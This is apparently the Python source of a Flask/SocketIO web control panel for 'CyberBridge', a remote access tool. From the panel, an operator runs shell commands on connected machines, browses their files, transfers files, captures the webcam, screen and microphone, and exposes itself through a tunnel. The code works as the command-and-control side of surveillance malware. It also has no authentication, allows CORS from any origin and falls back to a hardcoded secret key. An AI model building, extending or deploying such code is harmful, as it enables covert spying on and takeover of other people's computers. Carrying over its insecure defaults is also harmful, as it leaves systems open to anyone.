"""
CyberBridge - Web UI Server (Flask + SocketIO)
Serves Liquid Glass frontend and bridges WebSocket to SessionManager.
"""

import os
import sys
from dotenv import load_dotenv
load_dotenv()

import threading
import logging
from flask import Flask, send_from_directory, request
from flask_socketio import SocketIO, emit

_ROOT = os.path.join(os.path.dirname(__file__), '..', '..')
sys.path.insert(0, _ROOT)

from server.core.session_manager import ProtocolFactory
from server.core.proxy_manager import ProxyManager

logger = logging.getLogger("cyberbridge.web")

class WebServer:
    def __init__(self, port=None, protocol='HTTP'):
        self.port = port or int(os.environ.get('WEB_UI_PORT', 18814))
        self.protocol = protocol
        self.app = Flask(__name__, static_folder=os.path.join(os.path.dirname(__file__), 'web_ui'))
        self.app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY', 'cyberbridge-secret')
        from flask_cors import CORS
        cors_origins = os.environ.get("CORS_ORIGINS", "*")
        CORS(self.app, resources={r"/*": {"origins": cors_origins}})
        self.socketio = SocketIO(self.app, cors_allowed_origins=cors_origins)
        self.proxy_mgr = ProxyManager()
        self.manager = None
        self._setup_routes()
        self._setup_socketio()

    def _setup_routes(self):
        @self.app.route('/')
        def index():
            return send_from_directory(self.app.static_folder, 'index.html')
        @self.app.route('/<path:path>')
        def static_files(path):
            return send_from_directory(self.app.static_folder, path)

    def _setup_socketio(self):
        @self.socketio.on('connect')
        def on_connect():
            logger.info("Web client connected")
            emit('sessions', self._serialize_sessions())

        @self.socketio.on('get_sessions')
        def on_get_sessions():
            emit('sessions', self._serialize_sessions())

        @self.socketio.on('command')
        def on_command(data):
            client_id = data.get('client_id')
            cmd = data.get('command', '')
            sid = request.sid
            session = self.manager.get_session(client_id) if self.manager else None
            if not session:
                emit('command_result', {'error': 'session not found'})
                return
            def _run():
                try:
                    res = session.execute_command(cmd)
                    self.socketio.emit('command_result', {'client_id': client_id, 'output': res}, room=sid)
                except Exception as e:
                    self.socketio.emit('command_result', {'error': str(e)}, room=sid)
            threading.Thread(target=_run, daemon=True).start()

        @self.socketio.on('get_system_info')
        def on_sysinfo(data):
            client_id = data.get('client_id')
            session = self.manager.get_session(client_id) if self.manager else None
            if session:
                info = session.get_system_info()
                emit('system_info', {'client_id': client_id, 'info': info})

        @self.socketio.on('list_directory')
        def on_list_dir(data):
            client_id = data.get('client_id')
            path = data.get('path', 'C:\\')
            session = self.manager.get_session(client_id) if self.manager else None
            if session:
                files = session.list_directory(path)
                emit('dir_listing', {'client_id': client_id, 'path': path, 'files': files})

        @self.socketio.on('get_camera_frame')
        def on_camera(data):
            client_id = data.get('client_id')
            sid = request.sid
            session = self.manager.get_session(client_id) if self.manager else None
            if not session:
                emit('camera_frame', {'error':'session not found'})
                return
            def _run():
                try:
                    frame = session.get_camera_frame()
                    # send as base64 string
                    import base64
                    b64 = base64.b64encode(frame).decode() if frame else ''
                    self.socketio.emit('camera_frame', {'client_id':client_id,'data':b64}, room=sid)
                except Exception as e:
                    self.socketio.emit('camera_frame', {'error':str(e)}, room=sid)
            threading.Thread(target=_run, daemon=True).start()

        @self.socketio.on('screenshot')
        def on_screenshot(data):
            client_id = data.get('client_id')
            sid = request.sid
            session = self.manager.get_session(client_id) if self.manager else None
            if not session:
                emit('screenshot_result', {'error':'session not found'})
                return
            def _run():
                try:
                    img = session.screenshot()
                    import base64
                    b64 = base64.b64encode(img).decode() if img else ''
                    self.socketio.emit('screenshot_result', {'client_id':client_id,'data':b64}, room=sid)
                except Exception as e:
                    self.socketio.emit('screenshot_result', {'error':str(e)}, room=sid)
            threading.Thread(target=_run, daemon=True).start()

        @self.socketio.on('screen_frame')
        def on_screen_frame(data):
            client_id = data.get('client_id')
            quality = data.get('quality',45)
            scale = data.get('scale',0.65)
            sid = request.sid
            session = self.manager.get_session(client_id) if self.manager else None
            if not session:
                emit('screen_frame_result', {'error':'session not found'})
                return
            def _run():
                try:
                    img = session.screen_frame(quality, scale)
                    import base64
                    b64 = base64.b64encode(img).decode() if img else ''
                    self.socketio.emit('screen_frame_result', {'client_id':client_id,'data':b64}, room=sid)
                except Exception as e:
                    self.socketio.emit('screen_frame_result', {'error':str(e)}, room=sid)
            threading.Thread(target=_run, daemon=True).start()

        @self.socketio.on('start_audio')
        def on_start_audio(data):
            client_id = data.get('client_id')
            session = self.manager.get_session(client_id) if self.manager else None
            if session:
                ok = session.start_audio()
                emit('audio_started', {'client_id':client_id,'ok':ok})

        @self.socketio.on('stop_audio')
        def on_stop_audio(data):
            client_id = data.get('client_id')
            session = self.manager.get_session(client_id) if self.manager else None
            if session:
                ok = session.stop_audio()
                emit('audio_stopped', {'client_id':client_id,'ok':ok})

        @self.socketio.on('get_audio_chunk')
        def on_audio_chunk(data):
            client_id = data.get('client_id')
            sid = request.sid
            session = self.manager.get_session(client_id) if self.manager else None
            if not session:
                emit('audio_chunk', {'error':'session not found'})
                return
            def _run():
                try:
                    chunk = session.get_audio_chunk()
                    import base64
                    b64 = base64.b64encode(chunk).decode() if chunk else ''
                    self.socketio.emit('audio_chunk', {'client_id':client_id,'data':b64}, room=sid)
                except Exception as e:
                    self.socketio.emit('audio_chunk', {'error':str(e)}, room=sid)
            threading.Thread(target=_run, daemon=True).start()

        @self.socketio.on('start_audio_record')
        def on_start_record(data):
            client_id = data.get('client_id')
            session = self.manager.get_session(client_id) if self.manager else None
            if session:
                ok = session.start_audio_record()
                emit('audio_record_started', {'client_id':client_id,'ok':ok})

        @self.socketio.on('stop_audio_record')
        def on_stop_record(data):
            client_id = data.get('client_id')
            sid = request.sid
            session = self.manager.get_session(client_id) if self.manager else None
            if not session:
                emit('audio_record_result', {'error': 'session not found'})
                return
            def _run():
                try:
                    data_bytes = session.stop_audio_record()
                    import base64
                    b64 = base64.b64encode(data_bytes).decode() if data_bytes else ''
                    self.socketio.emit('audio_record_result', {'client_id':client_id,'data':b64}, room=sid)
                except Exception as e:
                    self.socketio.emit('audio_record_result', {'error':str(e)}, room=sid)
            threading.Thread(target=_run, daemon=True).start()

        @self.socketio.on('set_protocol')
        def on_set_protocol(data):
            protocol = data.get('protocol','HTTP')
            sid = request.sid
            def _restart():
                try:
                    if self.manager:
                        self.manager.stop()
                    self.protocol = protocol
                    def _update():
                        self.socketio.emit('sessions', self._serialize_sessions())
                    self.manager = ProtocolFactory.create_manager(protocol, on_client_update=_update)
                    self.manager.start()
                    self.socketio.emit('protocol_changed', {'protocol':protocol}, room=sid)
                    self.socketio.emit('bottom_update', {'text':f'CyberBridge Server | {protocol.upper()} | ngrok compatible'})
                except Exception as e:
                    self.socketio.emit('protocol_changed', {'error':str(e)}, room=sid)
            threading.Thread(target=_restart, daemon=True).start()

        @self.socketio.on('start_tunnel')
        def on_start_tunnel(data):
            proxy = data.get('proxy','')
            sid = request.sid
            def _run():
                try:
                    self.proxy_mgr.stop_proxy()
                    def on_url(url):
                        self.socketio.emit('tunnel_url', {'url':url}, room=sid)
                        self.socketio.emit('bottom_update', {'text':f'CyberBridge Server | {self.protocol.upper()} | {proxy}: {url}'})
                    def on_err(err):
                        self.socketio.emit('tunnel_error', {'error':err}, room=sid)
                    def on_log(line):
                        self.socketio.emit('tunnel_log', {'line':line}, room=sid)
                    self.proxy_mgr.start_proxy(proxy, 18812, on_url_found=on_url, on_error=on_err, on_log=on_log)
                except Exception as e:
                    self.socketio.emit('tunnel_error', {'error':str(e)}, room=sid)
            threading.Thread(target=_run, daemon=True).start()

        @self.socketio.on('file_upload')
        def on_file_upload(data):
            client_id = data.get('client_id')
            remote_path = data.get('remote_path','')
            filename = data.get('filename','')
            b64data = data.get('data','')
            sid = request.sid
            session = self.manager.get_session(client_id) if self.manager else None
            if not session:
                self.socketio.emit('file_upload_result', {'error':'session not found'}, room=sid)
                return
            def _run():
                try:
                    import tempfile, os, base64
                    # Normalize remote path and append filename if directory given
                    norm_remote = remote_path.replace('/', os.sep)
                    norm_remote = os.path.normpath(norm_remote)
                    remote_base = os.path.basename(norm_remote)
                    if norm_remote.endswith(os.sep) or remote_base == '' or '.' not in remote_base:
                        norm_remote = os.path.join(norm_remote, filename)
                    remote_path = norm_remote
                    tmp = tempfile.NamedTemporaryFile(delete=False, suffix=os.path.splitext(filename)[1])
                    tmp_path = tmp.name
                    tmp.close()
                    with open(tmp_path,'wb') as f:
                        f.write(base64.b64decode(b64data))
                    ok = session.upload_file(tmp_path, remote_path)
                    os.unlink(tmp_path)
                    self.socketio.emit('file_upload_result', {'ok':ok}, room=sid)
                except Exception as e:
                    self.socketio.emit('file_upload_result', {'error':str(e)}, room=sid)
            threading.Thread(target=_run, daemon=True).start()

        @self.socketio.on('file_download')
        def on_file_download(data):
            client_id = data.get('client_id')
            remote_path = data.get('remote_path','')
            sid = request.sid
            session = self.manager.get_session(client_id) if self.manager else None
            if not session:
                self.socketio.emit('file_download_result', {'error':'session not found'}, room=sid)
                return
            def _run():
                try:
                    import tempfile, os, base64
                    tmp = tempfile.NamedTemporaryFile(delete=False)
                    tmp_path = tmp.name
                    tmp.close()
                    ok = session.download_file(remote_path, tmp_path)
                    if ok and os.path.exists(tmp_path):
                        with open(tmp_path,'rb') as f:
                            b64 = base64.b64encode(f.read()).decode()
                        filename = os.path.basename(remote_path.replace('\\','/'))
                        os.unlink(tmp_path)
                        self.socketio.emit('file_download_result', {'ok':True,'filename':filename,'data':b64}, room=sid)
                    else:
                        self.socketio.emit('file_download_result', {'ok':False}, room=sid)
                except Exception as e:
                    self.socketio.emit('file_download_result', {'error':str(e)}, room=sid)
            threading.Thread(target=_run, daemon=True).start()

    def _serialize_sessions(self):
        if not self.manager:
            return []
        sessions = self.manager.get_sessions()
        out = []
        for s in sessions:
            out.append({
                'client_id': s.client_id,
                'hostname': s.hostname,
                'ip': s.ip,
                'port': s.port,
                'status': s.status_str
            })
        return out

    def start_core(self):
        def _update():
            self.socketio.emit('sessions', self._serialize_sessions())
        self.manager = ProtocolFactory.create_manager(self.protocol, on_client_update=_update)
        self.manager.start()
        logger.info("Core session manager started")
    
    def run(self):
        from server.config import SERVER_BIND_HOST
        self.start_core()
        bind_host = SERVER_BIND_HOST
        logger.info(f"Web UI listening on http://{bind_host}:{self.port}")
        self.socketio.run(self.app, host=bind_host, port=self.port, allow_unsafe_werkzeug=True)
